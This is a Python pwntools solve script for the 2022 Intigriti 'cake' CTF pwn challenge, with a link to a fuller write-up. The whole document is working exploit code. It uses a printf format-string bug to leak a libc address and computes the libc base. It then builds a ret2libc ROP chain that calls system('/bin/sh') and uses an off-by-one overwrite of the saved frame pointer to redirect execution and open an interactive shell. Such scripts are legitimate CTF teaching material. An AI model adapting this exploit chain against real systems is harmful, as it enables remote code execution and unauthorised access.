[FULL WRITEUP](https://book.cryptocat.me/ctf-writeups/2022/intigriti/pwn/cake)

#### solve.py

```py
#!/usr/bin/python
from pwn import *

e = ELF("./off_by_one/cake")
#p = e.process()
p = remote("localhost", 9999)        #                 <-- Use this for remote

libc = ELF('libc-2.27.so')

libc_leak_offset = 0x21BF7                             # The offset of <__libc_start_main+231>. Used to calculate libc base address
pop_rdi_offset = 0x00000000000215bf                    # pop rdi; gadget offset in libc
ret_offset = 0x00000000000008aa                        # ret; gadget offset in libc

def printf_leak():
    # Use the printf vuln to leak <__libc_start_main+231>
    p.recv()
    p.sendline("2")
    p.recvuntil("What could our chef do better?\n")
    p.sendline("%39$p")

    p.recv()
    p.sendline("3")
    leak = p.recvline()
    leak = int(leak[2:].strip(), 16)                    # convert the address to integer
    return leak

def returns():
    str = ''
    for i in range(0,28):
        str += p64(libc.address+ret_offset)
    return str

def bof(payload):
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline(payload)


# Leak libc address to calculate libc base address
libc_leak = printf_leak()
log.info("Libc Leak: %s", hex(libc_leak))
libc.address = libc_leak - libc_leak_offset
log.info("Libc Base Address: %s", hex(libc.address))

# craft payload based on gadgets.
payload = returns()
payload += p64(libc.address+pop_rdi_offset)
payload += p64(next(libc.search('/bin/sh\x00')))
payload += p64(libc.symbols['system'])
payload += 'AAAAAAAA\x00'                                # Use off-by-one vuln to overwrite least significant byte of
bof(payload)                                             # saved rbp with 0x00, shifting code execution to our buffer.
p.interactive()
```
